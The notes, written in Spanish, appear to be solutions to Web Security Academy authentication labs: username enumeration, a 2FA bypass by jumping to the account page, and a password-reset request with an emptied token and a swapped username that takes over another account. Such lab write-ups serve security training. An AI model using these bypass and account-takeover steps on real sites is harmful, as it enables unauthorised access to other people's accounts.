# Username enumeration via different responses

Para resolver este laboratorio fue basicamente usando el intruder y viendo las respuestas 
diferentes nada que no se hiciera antes ( por eso no pongo nada)
Primero por el user y luego con el password.

# 2FA simple bypass

Para este laboratorio primero entro a la cuenta de wiener pones el codigo de 2FA y te das cuenta cual es la url a la que redirecciona
Despues entras con el usuario carlos te pide el 2FA y pones la redireccion y bypaseas la dirección.

```
https://0ac0005004569ddec0d9b598000300f9.web-security-academy.net/my-account

```
# Password reset broken logic

Para este laboratorio los pasos son con la cuenta de wiener probar como se cambian los passwords nos damos cuenta
que se genera una peticion post

```

POST /forgot-password?temp-forgot-password-token= HTTP/1.1
Host: 0a4500e903bb9d82c0c354c5004200a9.web-security-academy.net
Cookie: session=mHQvAUXSlvYVoQhyaakHp9dEPz0azo43
Content-Length: 85
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a4500e903bb9d82c0c354c5004200a9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4500e903bb9d82c0c354c5004200a9.web-security-academy.net/forgot-password?temp-forgot-password-token=LLovPAZYOGV6wJ30Uw7rcfMC7IHTCeif
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close

temp-forgot-password-token=&username=carlos&new-password-1=peter&new-password-2=peter

```

Y que se genera un token que se replica abajo y arriba si se borra dicho token aun si se borra genera un cambio de password como en el ejemplo de arriba
ahora solo cambias el username por carlos y listo pudiste cambiar el password de la cuenta de carlos.

















